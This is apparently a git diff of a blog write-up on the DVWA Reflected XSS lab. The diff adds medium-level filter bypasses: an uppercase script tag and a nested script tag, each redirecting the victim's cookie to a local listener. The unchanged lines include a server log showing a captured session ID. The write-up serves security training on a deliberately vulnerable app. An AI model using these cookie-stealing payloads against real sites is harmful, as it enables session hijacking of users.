@@ -2,7 +2,7 @@
 title: DVWA - XSS (Reflected)
 date: 2023-12-17
 categories: [CTF, Web Exploitation]
-tags: [dvwa, xss, xss-reflected, cross-site-scripting, burp, javascript]
+tags: [dvwa, xss, xss-reflected, cross-site-scripting, javascript]
 img_path: /assets/dvwa/xss_reflected
 published: true
 ---
@@ -56,7 +56,7 @@ Because its a **reflected XSS**, the malicious code is not stored in the remote 
     <script>alert(document.cookie)</script>
     ```
 
-    ![](xss_test.png)
+    ![](low_test.png)
 
 4. Our goal is to get our target's cookie value, so we will have to use a payload that grabs his cookie but also send it to us. Let's start by launch a Python3 HTTP server:
 
@@ -127,12 +127,24 @@ Because its a **reflected XSS**, the malicious code is not stored in the remote 
     127.0.0.1 - - [17/Dec/2023 17:37:35] "GET /?cookie=security=medium;%20PHPSESSID=gmij2886a88afu2o2l0fkt1943 HTTP/1.1" 200 -
     ```
 
+4. The developer's code is case sensitive so it is only checking for an exact match of `<script>`. So, we could also use the following payload to bypass this:
+
+    ```javascript
+    <SCRIPT>window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie</script>
+    ```
+
+5. We could also apply the same concept as we did on the [LFI](https://cspanias.github.io/posts/DVWA-File-Inclusion/#local-file-inclusion-1) section, and pass the following payload:
+
+    ```javascript
+    <scr<script>ipt>window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie</script>
+    ```
+
 ## Security: High
 > _The developer now believes they can disable all JavaScript by removing the pattern `<s*c*r*i*p*t` ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_reflected/xss_reflected_high_source.php))._
 
 > You can fix the error as above.
 
-1. This level can be attacked the same way as the previous one:
+1. This level can be attacked the same way as the previous one as the developer just changed the blacklisted pattern to `<s*c*r*i*p*t`:
 
     ![](high_payload.png)
 
